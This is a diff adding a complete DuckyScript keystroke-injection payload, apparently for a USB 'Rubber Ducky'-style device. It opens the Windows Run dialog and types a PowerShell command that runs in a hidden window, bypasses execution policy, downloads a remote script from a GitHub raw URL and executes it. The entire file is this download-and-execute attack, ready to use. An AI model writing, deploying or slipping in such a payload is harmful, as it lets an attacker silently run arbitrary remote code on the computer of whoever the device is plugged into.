@@ -1,0 +1,7 @@
+REM AUTHOR n00l
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell -w hidden -ep bypass IEX(IWR https://raw.githubusercontent.com/softpiano/fun/refs/heads/main/speach.ps1)
+ENTER
